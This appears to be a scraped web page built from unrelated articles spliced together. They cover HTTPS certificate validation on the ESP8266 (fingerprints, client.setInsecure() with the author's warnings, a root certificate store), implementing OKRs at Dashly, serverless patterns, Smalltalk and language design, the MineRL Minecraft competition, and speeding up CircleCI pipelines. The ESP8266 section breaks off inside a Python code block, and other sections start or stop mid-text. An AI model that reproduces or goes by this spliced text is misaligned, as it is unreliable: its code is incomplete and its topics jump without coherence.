fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>.</p><p>When it is verified that the certificate is indeed issued by a trusted root CA issuer, it is verified that the domain in the certicate is the same as the actual domain. If that is true, we know that the server is who it claims to be, and a secure connection can be started . </p><p>These trusted root certificates are actually stored as part of your browser to be able to validate all other certificates. Each OS or browser stores a slightly different set of roughly 100-200 root certificates, which it knows can be trusted. This is called a certificate store, and this is exactly what I will apply on the ESP8266 later in this article. But first, let's start with the two most popular other approaches.</p><h3>Fingerprints - secure but annoying</h3><p>The method that is proposed in the official ESP8266 Arduino <a href="https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/client-secure-examples.html" target="_blank" rel="noopener noreferrer">documentation<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a> is to extract the fingerprint of a site's certificate and store this in the code. The fingerprint is a hash of the certificate. Because it is very unlikely that a second certificate exists with the same hash, we know the website can be trusted if the hash is the same as the one we store.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
const char<span>*</span> fingerpr <span>=</span> <span>"CF 05 98 89 CA FF 8E D8 5E 5C E0 C2 E4 F7 E6 C3 C7 50 DD 5C"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>

<span>if</span> <span>(</span>client<span>.</span><span>verify</span><span>(</span>fingerpr<span>,</span> host<span>)</span><span>)</span> 
<span>{</span>  
    http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

    <span>String</span> payload<span>;</span>
    <span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
        payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
<span>}</span>
<span>else</span> 
<span>{</span>
  <span>Serial</span><span>.</span><span>println</span><span>(</span><span>"certificate doesn't match"</span><span>)</span><span>;</span>
<span>}</span></code></pre><p>This approach is simple because the certificate chain does not need to be validated, but has two main issues for me:</p><ol><li>The fingerprint needs to be extracted and stored manually for each page the ESP8266 needs to connect to.</li><li>An even bigger issue is that these fingerprints change roughly once a year when the certificate expires. This means that your program can break at any time and you manually need to update the fingerprint in your code.</li></ol><h3>client.setInsecure() - easy but unsafe</h3><p>You could argue that secure connections are overkill for your application. I would be the first to admit that I prefer a pragmatic solution where possible. Imagine that all you want to do with your ESP8266 is to fetch the weather from the internet and display it in some form. Personally I would not mind to do this in an insecure way, since there are no real dangers.</p><p>But imagine the ESP8266 is controlling the lock on your door or a 3D printer which can heat up and catch on fire. Or think of the case where you are transfering personal information to or from some site or API. In these cases it is better to be safe than sorry, and the method in this section should not be used. Nevertheless, I will show it here:</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>setInsecure</span><span>(</span><span>)</span><span>;</span> <span>//the magic line, use with caution</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>
  
http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
</code></pre><p>So basically all you need to do is to add <span>client.setInsecure()</span> to your code and it will start the connection without validating the certificate. </p><h3>HTTPS requests with the IoT framework</h3><p>With that out of the way, we finally get to the implementation I have chosen instead for my ESP8266 IoT Framework, which is placed in the <span>fetch</span> class.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>            

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>fetch<span>.</span><span>GET</span><span>(</span>host<span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    

fetch<span>.</span><span>clean</span><span>(</span><span>)</span><span>;</span>
</code></pre><p>Looks easy enough doesn't it ? So what happens behind the scenes? </p><p>Basically the same thing as in a typical Browser. The ESP8266 contains a full store of all the trusted root certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> memory. This takes roughly ~170 kB of flash memory at the moment, which in my case can easily be missed. This certificate store is generated automatically on building the sofware, no manual steps required. This also means that you can do secure HTTPS requests to any URL (so you could even configure or change a URL after the build).</p><p>You might think, but hey! These certificates will expire too. And this is true. The only difference with the fingerprints is that the validity of root certificates is much longer, and can be over 20 years. Whereas the fingerprint for some services can change every few months.</p><p>As a starting point I found a great but hidden example in the ESP8266 Arduino <a href="https://github.com/esp8266/Arduino/tree/master/libraries/ESP8266WiFi/examples/BearSSL_CertStore" target="_blank" rel="noopener noreferrer">repo<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>. This example contains a Python script that gets all the certificates from the Mozilla root certificate store and stores them as files. These files will then be uploaded to the <abbr title="SPIFFS is an abbreviation for 'Serial Peripheral Interface Flash File System', which is a way to store files on embedded systems.">SPIFFS</abbr> and used during HTTPS requests. I adapted this example to be able to store the certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> instead.</p><h3>Generating a certificate store</h3><p>When a request is started, the <span>certStore</span> class will compare the hash of the certificate issuer with all the hashes of the stored root certificates. If there is a match, the correctness of the domain and other properties will be checked and the connection will be initialized.</p><p>In the default Arduino example these hashes for the stored certificates are generated in the <span>certStore</span> class. It seems more logical to me to do this directly in the Python script to save computing time on the ESP8266, so thats where I moved it. Furthermore I adapted the <span>certStore</span> class (<a href="https://github.com/maakbaas/esp8266-iot-framework/blob/master/src/certStore.cpp" target="_blank" rel="noopener noreferrer">GitHub<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>) to read the information from my <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> variables rather than the file system. </p><p>The final Python script to generate the certificate store is shown below.</p><pre><code><span>from</span> __future__ <span>import</span> print_function

<p>In this article, we’ll tell you what the OKR concept implies and how to start adhering to it.</p>


<div>
  <p>
    When we grew from 10 to 30 people, we got to thinking we became defocused and asynchronous. One part of the team didn’t know what another one was doing; we were playing the Chinese whispers feeling we were heading separate ways. That’s exactly when we decided to adhere to OKR and we still do so.   </p>

  
</div>




<p>Many companies face the same problem, and the OKR framework helps tackle the issue, namely sync people up and help them move in the same direction while meeting their objectives. We’ve got some experience to tell you how you can implement OKR and why no one can do this right the first time (which is completely normal).</p>



<p>To make this article more insightful, we’ve talked to Ilya, a product &amp; strategy thinking mentor, and discovered his experience in implementing OKR in different companies.</p>



<p>Grab your pen and some paper and make notes on the OKR implementation as you read this article.&nbsp;</p>




<h2 id="what-is-the-okr">What is the OKR?</h2>



<p><strong>OKR (objectives and key results)</strong> is a goal-setting framework helping you determine the direction of your company’s growth, sync teams up, and engage all employees in the process of setting objectives and defining key results.&nbsp;</p>



<p>The objectives are set at these levels:</p>



<ul><li>company,</li><li>teams,</li><li>particular employees.</li></ul>



<p>Objectives are then decomposed into measurable results the company wants to achieve. The objective is marked as achieved if a certain result is met.</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg" alt="mission strategy key results tasks" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg"></figure>



<p>OKRs first appeared in Intel and then moved to Google. Now many high profile companies like Spotify, Twitter, Airbnb, and Miro use them. It doesn’t mean OKRs can only be applied in the IT universe. You can use them anywhere! Even when planning your own life. I mean it.&nbsp;</p>



<p>For example, my objective for the next 2 years is to learn French. My key results are to pass DALF for C1 and have 10 Tinder matches with native speakers.&nbsp;</p>



<p>The major thing about OKR is that both top management and the whole company are involved in defining objectives and key results. That’s why OKRs help you sync up with your team, move in the same direction, and increase the involvement of each team member as everyone knows how they can influence the achievement of a common objective.&nbsp;</p>




<h2 id="what-makes-okrs-so-great">What makes OKRs so great?</h2>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg" alt="what makes OKR great" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg"></figure>



<p><strong>Transparency:</strong> to make sure OKRs work for good, the company should be 100% transparent for its employees. That’s the only way you can encourage the team to perform great. Every employee should have access to OKRs.</p>



<p><strong>Simplicity:</strong> OKRs are easy to use and understand. Any person opening the OKR spreadsheet can easily get what it’s saying.</p>



<p><strong>Flexibility:</strong> OKRs can be set for any term from a month to several years. This helps you set the pace of the company’s development and adjust to the environment quickly.</p>



<p><strong>Two-way goal-setting:</strong> OKRs are not set for teams by the top management. They can draw up the OKRs, but then they should pass them on to teams so that they can edit and adjust the OKRs. And there can be several iterations.</p>



<p><strong>Inspiring goals:</strong><strong> </strong>within the OKR concept, objectives should be ambitious and catchy. Inspiring objectives encourage the team to achieve better results. However, the OKR assumes that you can’t achieve 100% of your objectives and that’s completely okay.</p>



<p><strong>An OKR isn’t a KPI:</strong> The OKR concept doesn’t have an incentive system for achieving objectives. Non-monetary motivation establishes a welcoming environment. So, employees are willing to generate ambitious ideas and have no fear of not meeting the targets.&nbsp;</p>


<div>
  <p>
    An OKR isn’t a KPI. There’s no cash bonus for meeting the OKR. The concept is different, and that’s cool. An OKR isn’t something that should be 100% achieved. If we achieve 100% of our OKRs, it means our objectives were not ambitious enough. And vice versa, if we only achieved 30% of our OKRs, it means we’ve set the bar too high. Meeting around 70% of OKRs says we’re doing a great job.  </p>

  
</div>





<h2 id="objectives-key-results-and-initiatives">Objectives, key results, and initiatives</h2>



<p>How do we define Objectives and Key Results (KR)? John Doerr’s formula helps you get the difference between these two.<a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/John_Doerr" target="_blank" rel="noreferrer noopener"> John Doerr</a> is the person who invented OKR and shared his knowledge with Google. Here’s his formula:</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg" alt="i will be as measured by" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg"></figure>



<p>Within the concept, the objective setting is based on its definition and our perception of an achieved objective. The objective should describe the target, and the key results are the parameters we will use to know if we have met the objective. Let’s look closer at the formula:&nbsp;</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg" alt="i will be happy in case" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg"></figure>



<p>Key results are an equally important part of the formula. They are decisive in whether an objective has been met or not.</p>



<p>Another way to understand KRs is to ask the question: “If our goal is X, what will success look like?”</p>


<div>
  <p>
    The OKR has an objective that may sound obscure in terms of the result, but it’s powerful and appealing. The second part is the key result, most often it’s a specific metric. The key result shows whether the objective has been met or not. If the goal is inspiring, then the KR reflects reality.  </p>

  
</div>




<h3><strong>What should be the objectives?</strong></h3>



<p><strong>Objectives </strong>are catchy qualitative descriptions of what we want to achieve. Objectives should be concise, ambitious, inspiring, and engaging. They must encourage and challenge the team. In this case, the whole company will have a better chance of achieving greater success.</p>



<h3><strong>What are the “key results”?</strong></h3>



<p><strong>Key results </strong>are a set of parameters that we use to assess how close we have gotten to our objective. Each objective usually involves between 3 to 5 KRs. If you pick more, the teams will find it hard to stay focused. Key results must be quantitative and measurable.</p>



<p>There are 2 kinds of key results:</p>



<ul><li><strong>Key action-driven result.</strong> Success is measured in completed/not completed projects.</li><li><strong>Key value-driven result.</strong> Success is measured in the value that the company or customers obtain.</li></ul>



<p>Here are some results of key action-driven results:</p>



<ul><li>the chatbot launch</li><li>an online course launching</li><li>the OKR book release</li></ul>



<p>Below are some key value-driven results:</p>



<ul><li>increasing the MRR from X to Y;</li><li>decreasing the Churn rate from X to Y;</li><li>increasing the ER from X to Y;</li><li>maintaining the CAC at around X.</li></ul>



<p>Take a look at the table of key action-driven results and their value equivalents:</p>



<div><figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg" alt="key action-driven results and key value-driven results" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg"></figure></div>



<p>Key action-driven results are highly likely to fail in leading you to an objective. The release of a new feature is not a success guarantee. That’s why OKRs have to be value-driven. Only then can they be as effective as possible.&nbsp;</p>



<p>Key results should reflect the value to the company or its customers. Teams will be focused on achieving greater success and there’ll be more room for creativity. The employees won’t be stuck on a particular activity but will look for different ways to achieve the objective.&nbsp;</p>



<p>But if you’re implementing the concept for the first time, it makes more sense to choose actions as key results. They will help you to switch to OKR:</p>



<p>Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics.</p>


<div>
  <p>
    Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics. First, it’s a good idea to put a set of actions in KRs that we have to perform to get closer to the objective: release a huge feature or a marketing campaign. By the end of the OKR term, you’ll be able to evaluate the success based on the done/not done principle. Another very important point is to only include metrics that we know how to calculate in KRs.   </p>

  
</div>




<h3>How we did it at Dashly</h3>



<p>Last year, the goal for OKR in Dashly was to double the number of active users. It’s a catchy and quite ambitious goal, isn’t it?&nbsp;</p>



<p>How do we know if we’ve achieved it or not? We’ve chosen key metric-based results and we’ve put all our effort to reach them and evaluate our success using them.</p>



<p>If objectives are about ambitions, key results must be clear and precise.&nbsp;</p>



<p>The key results for the “doubling” target could be the following:</p>



<ul><li>Increasing the MRR to X: this is our monthly revenue. If we want to grow, we should grow our revenue, too.&nbsp;</li><li>Decreasing the Churn rate to Y. The fewer users leave us, the easier it is for us to grow.</li><li>The CAC must not exceed: this is the Customer Acquisition Cost. If we want to be efficient, we can’t spend more than a certain amount on user acquisition.</li><li>Increasing the number of organic visitors to X. The more website visitors we have, the more purchases we generate.&nbsp;</li></ul>



<h3>OKR initiatives</h3>



<p>Objectives and key results should be value-oriented. So, you must learn not to mix them up with activities and tasks that need to be done to achieve the OKR. Initiatives will help in this.</p>



<p><strong>Initiatives </strong>are the very activities, tasks, and projects that you need to accomplish to achieve the OKR.</p>



<p>Let’s get back to our goal of doubling up. We’ve chosen several key results we’ll use to evaluate our success in the future. The KRs are to increase the MRR to X and decrease the Churn rate to Y. And these are the initiatives:&nbsp;&nbsp;</p>



<ul><li>launching the chatbot: a huge and awesome feature will help decrease the customer churn;</li><li>online course release will help generate new target leads;</li><li>the OKR book release will help increase the number of product signups.</li></ul>

<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on<strong> <a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a>&nbsp;</strong>that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.</p>
<p>I will be adding new patterns regularly, each with interactive architecture diagrams to help you better understand them, and sample templates for you to begin quickly implementing them in your serverless projects. <strong>This is a community effort, so <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener">contributions</a> are welcome and greatly appreciated.</strong> Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<p>I’ve been thinking about designing my own programming language for a long time. I’ve actually been keeping a lot of notes, and even throwing together some code when I can find time. My plan is to build something that takes inspiration from LISP, JavaScript and Smalltalk. I think there’s a niche to be filled. There are many new programming languages coming out lately, but most of them are statically typed and compiled ahead of time. The <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">dynamic languages</a> that do come out often don’t perform very well (see CPython, Ruby) or have poorly thought out&nbsp;semantics.</p>
<p>I’ve written a few&nbsp;blog posts pointing and laughing at perceived failures of JavaScript, but the truth is that programming language design is hard.&nbsp;There’s no limit to the complexity of the things you can build with programming code. No matter the design choices you make, no matter the language you design, there are bound&nbsp;to be some inconsistencies and weaknesses somewhere.&nbsp;I think that Smalltalk is a very inspiring programming language, revolutionary in many ways, but it’s also one that has gone extinct. It’s interesting, in my opinion, to ask ourselves why Python thrives but Smalltalk died.</p>
<p>Like LISP, Smalltalk implemented some interesting features which have influenced other languages (such as Java and JavaScript). Some nifty features of Smalltalk are really cool, but still aren’t implemented in any other language. For instance, Smalltalk had the ability to suspend running programs into a saved image, and resume execution later at the saved point. As you can imagine, this is extremely powerful and useful. Forget saving documents or saving games, just save the state of an entire program, no implementation effort required.</p>
<p>I found an interesting talk on YouTube titled “What Killed Smalltalk could Kill Ruby Too”:</p>
<p><span><iframe width="560" height="315" src="https://www.youtube.com/embed/YX3iRjKj7C0?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Robert Martin makes the case that one of the big weaknesses of Smalltalk is&nbsp;that it was just “too easy to make a mess”. Smalltalk was highly dynamic, and encouraged people to “monkey patch” things and do quick fixes/hacks.&nbsp;He also makes the point that Smalltalk just “didn’t play well with others”. When you think about it, Smalltalk had its own source control, IDE and GUI built into live images, living alongside your program. Smalltalk isn’t just a language, it’s an operating system and a way of life. It’s conflating things that would maybe be best left separate.</p>
<p>It seems to me that in some key areas, the&nbsp;Smalltalk creators placed their own radical ideas above everything else. They chose idealism over pragmatism. Smalltalk was a language created with a grandiose vision. It had some deeply rooted principles which didn’t necessarily work so well in practice, such as the idea that everything had to be an object, that the object metaphor should be applied everywhere, one size fits all.&nbsp;At the end of the day, programmers want to get things done and be productive. If the language design or implementation gets in the way of getting things done, people will leave. Pragmatism is key for a programming language to succeed.</p>
<p>Smalltalk was also designed with the idea that it should be easy to learn and intuitive. This has led its creators to have a heavy focus on graphical user interfaces.&nbsp;I watched an introduction to <a href="https://www.youtube.com/watch?v=Ox5P7QyL774">Self on YouTube</a>&nbsp;(Self is a direct descendent of Smalltalk) and saw the heavy emphasis on interacting with objects through UIs. The user interfaces showcased in this video are, in my opinion, horribly complex and unintuitive. Pretty much all of the interactions done through the UI would have been simpler and easier to understand if they had been done by writing one or two lines of code instead!</p>
<p>When you sit down and think about it for one second, you have to realize that programming doesn’t fundamentally have anything to do with graphical user interfaces. Yes, you can use programming code to create GUIs, but there is no reason that programming should have to involve GUIs and be tied to them. The metaphor of writing code has been extremely successful since the very beginning, and it probably makes more sense to the mathematical mind of a skilled programmer. Not everything has to have a visual metaphor. This is again a case of pushing some idealistic principle too far, in my opinion.</p>
<p>I believe that a lack of pragmatism is something that has killed many languages. Not just Smalltalk, but Scheme too. My first experience with Scheme involved trying and failing to install multiple Scheme distributions because I couldn’t get all the dependencies to work. Then, finally getting a Scheme compiler installed, and struggling to implement simple routines to parse text files, because Scheme doesn’t include&nbsp;the most basic string routines. The Scheme compiler I’d selected bragged that the code it produced was highly optimized, but once I finally managed to write my own string routines, I compiled my program, ran it, and it was dog slow.&nbsp;Parsing a one-megabyte CSV spreadsheet took over a minute. I ended up rewriting the code in Python. Why don’t more people code in Scheme? Because they try to realize their ideas in Scheme, and it just doesn’t quite work out.</p>

<p>We are holding a competition on sample-efficient reinforcement learning using human priors. Standard methods require 
months to years of game time to attain human performance in complex games such as Go and StarCraft. In our competition,
 participants develop a system to obtain a diamond in Minecraft using only four days of training time.

<p>The MineRL competition offeres a set of Gym environments paired with human demonstrations to provide participants with
the ability to tackle the difficult Minecraft sample efficiently. This year we are introducing a new 
vectorized action and observation space that obscures the agent’s actions to prevent participants from using domain
knowlege to solve the ObtainDiamond task!</p>

<h3> The Task: Obtain Diamond in Minecraft </h3>

<p>Minecraft is a 3D, first-person, open-world game centered around the gathering of resources and creation of structures and items. These structures and items have prerequisite tools and materials required for their creation. As a result, many items require the completion of a series of natural subtasks.</p>

<p>The procedurally generated world is composed of discrete blocks that allow modification. Over the course of gameplay, players change their surroundings by gathering resources and constructing structures.</p>

<p>In this competition, the goal is to obtain a diamond. The agent begins in a random starting location without any items, and receives rewards for obtaining items which are prerequisites for diamond.</p>

Here’s a run that took 4:30:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/36Mmhm3hvFEcn2v5k45OJ8/c9120c139df16150910a69a8a5388cbb/1wsSz9yROEXnMvvHSmIt5J83YIAsS90sJaiuidmI.png" alt="CircleCI: without a cache."></p></div><p>Without a cache (such as when the job is first run, or when the list of node modules that make up the cache is changed), it takes around three minutes to install all dependencies from scratch, and another 40 seconds to save those dependencies to the cache:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7rhLcGIZiqLiOXPWaFowgQ/9c1139085b600e0151a3be12ca8d7588/16mAVWC6xAttEJckvXfz_6LOp7dcYRSMsxw0rZzQ.png" alt="CircleCI: with a cache."></p></div><p>This run time isn’t terrible, but it could be <strong>much</strong> better.</p><h2 id="accelerate-each-step">Accelerate each step</h2><p>With a little tinkering, almost every step in this job can be sped up. Let’s dive in:</p><h3 id="1-use-2nd-gen-convenience-images-for-quick-environment-spin-up">1. Use 2nd gen convenience images for quick environment spin up</h3><p>The “Spin Up Environment” step is responsible for creating the virtual environment in which your job will execute (hence “executor”). Pulling in an executor, in this example an entire Docker image, can be slow. Although you can specify a custom Docker image, CircleCI also provides <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/circleci-images/#next-generation-convenience-images">pre-made convenience images</a> that we have found to be very convenient.</p><p>CircleCI recently released a second-generation version of these convenience images, which promise faster spin-up times. The <a target="_blank" rel="noopener noreferrer" href="https://github.com/CircleCI-Public/cimg-base/blob/master/Dockerfile.template">cimg-base repository</a> documents everything that is installed in the base Docker Image. Because the convenience images are all built off of the same base image, they can cache very well <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/blog/how-to-build-a-docker-image-on-circleci-2-0/">using Docker Layer Caching</a>.</p><p>In our example, the only change we need to make is to point to one of these new images in our <code>executors</code>. In our case, we can also remove our credentials used to access our private image:</p><div><pre><p><span>1</span><span>executors:</span></p><p><span>2</span><span>   ci-node:</span></p><p><span>3</span><span>     docker:</span></p><p><span>4</span><span></span><span>-     - image: 123456789.dkr.ecr.eu-west-1.amazonaws.com/ci-node:our5ha</span><span></span></p><p><span>5</span><span></span><span>+     - image: cimg/node:14.3</span><span></span></p><p><span>6</span><span> </span></p><p><span>7</span><span> workflows:</span></p><p><span>8</span><span>   main_workflow:</span></p><p><span>9</span><span>     jobs:</span></p><p><span>10</span><span></span><span>+      - jest-unit</span><span></span></p><p><span>11</span><span></span><span>-      - jest-unit:</span><span></span></p><p><span>12</span><span></span><span>-         # Give this job AWS credentials to access our private Docker images</span><span></span></p><p><span>13</span><span></span><span>-         context: dev-ctx</span></p></pre></div><p>The results are pretty dramatic when the cache hits:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/4ramSJxcaUSP3OekcYBkRK/9fac31c12fdcd24b12a2a0a66056c72e/1j-4V-pGdkkTL6bRMc4LkeRZqINrhDWebZzn8j9E.png" alt="CircleCI: with cache hits."></p></div><p>Even when the cache doesn’t hit, there are usually enough layers cached that spinning up the environment now takes less than 15 seconds (down from 30-50 seconds before).</p><p>Even more helpful than this speed, the new convenience images are Debian-based. This allows us to use Unix tools that our developers are familiar with, like the package manager <code>apt</code>, instead of the sometimes-confusing Alpine <code>apk</code> (Alpine does not include common tools like <code>bash</code> or <code>jq</code> by default).</p><h3 id="2-use-shallow-clones-for-swift-code-checkout">2. Use shallow clones for swift code checkout</h3><p>Repositories balloon over time, especially if you use a monorepo as we do. Even if the file size at HEAD is kept relatively small, <a target="_blank" rel="noopener noreferrer" href="https://stackoverflow.com/questions/5613345/how-to-shrink-the-git-folder">past file blobs can stick around in the .git folder</a>. One of the best ways to speed up <code>git clone</code> commands is to use a <a target="_blank" rel="noopener noreferrer" href="https://www.perforce.com/blog/vcs/git-beyond-basics-using-shallow-clones">shallow checkout</a>.</p><p>There are a few open-source <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/orb-intro/">CircleCI Orbs</a> that make this optimization easy to implement. In particular, <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/orbs/registry/orb/guitarrapc/git-shallow-clone">we like this one</a> because it lets us customize any git settings we’d like.</p><p>To use this orb, at the top of your config, add:</p><div><pre><p><span>1</span><span>orbs</span><span>:</span><span></span></p><p><span>2</span><span>  </span><span>git-shallow-clone</span><span>:</span><span> guitarrapc/git</span><span>-</span><span>shallow</span><span>-</span><span>clone@2.0.3</span></p></pre></div><p>Then replace <code>- checkout</code> in all your jobs with <code>- git-shallow-clone/checkout</code>.</p><p>When we made this change, our checkout step dropped from 15-25 seconds down to 3-5 seconds just like that!</p><p>It’s worth noting that there are two reasons why someone might <em>not</em> use shallow checkouts:</p><ol><li><p><strong>Some Git commands are not supported by shallow checkouts.</strong>
These include fetching information from multiple branches or from deep in the Git history.</p></li><li><p><strong>Git providers sometimes rate limit shallow checkouts.</strong>
This only becomes an issue for large workflows or frequent runs.</p></li></ol><p>That said, for the majority of use cases, shallow checkouts are safe to use and can save a significant amount of time.</p><h3 id="3-untar-in-ram-for-rapid-cache-restores">3. Untar in RAM for rapid cache restores</h3><p>Caching <em>can</em> be a wonderful, run-time-saving thing. That said, accessing our large <code>node_modules</code> folder (nearly 300MB) from the CircleCI cache could sometimes take longer than starting from scratch with a fresh <code>yarn install</code>.</p><p>Internally, CircleCI manages caches and workspaces by putting files into a tarball and uploading that compressed tar file into Amazon S3. When you request a cache, CircleCI downloads the tar file from S3, validates that the file is the one that was requested, and then untars it.</p><p>Because <code>node_modules</code> can have thousands of files, even with lightning-fast network speeds, disk IO can slow down the untar process significantly.</p><p>In our example, restoring our cache took 1:07. Only 6 of those seconds were spent downloading and validating, while decompressing the files took over a minute. In the worst-case scenario, this cache restore step could take up to 3 minutes to complete.</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/6Jtu3bfEugHoXeUokHzzag/d747dd8b395c2fa20910eb5fb2c69538/1i1ZdxE38xmjY57AFoLK9hvEqWZ_fshqhPd6_gCI.png" alt="CircleCI: Untar in RAM."></p></div><p>Lucky for all of us, as of the <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/changelog#ram-disks">April 7th, 2020 CircleCI release</a>, CircleCI supports <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/executor-types/#ram-disks">mounted RAM disks</a> on Docker executors.</p><p>Using these RAM disks has dropped the <code>restore_cache</code> run time down to a consistent 10–20 seconds.

While the larger <code>resource_class</code> costs more money, because our jobs now finish in about half the time, the cost difference has been negligible.</p><p>And while your mileage may vary, give larger instance sizes a try and see if they work for your use case.</p><h3 id="4-parallelize-jobs-for-expedited-workflows">4. Parallelize jobs for expedited workflows</h3><p>Improved caching and access to caches is all very well and good, but when dependencies change, caches need to be updated. In these cases, the <code>yarn install</code> step will need to do more work, as well as the <code>Saving Cache</code> step, adding an extra minute or so to our pipelines. To solve this problem, we decided to play around with parallelization.</p><p>First, we tried saving the cache in a single job separate from all of our other jobs. Each subsequent job could then restore the cache from its saved location in the workspace instead of saving the cache as part of all of our jobs, including the jest tests:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/Uraphwbv2Qr5ch8w5Dc3g/cc782477babf02e39560d899b75a97c7/Before.svg" alt="CircleCI: before restore cache."></p></div><p>Became</p><div>

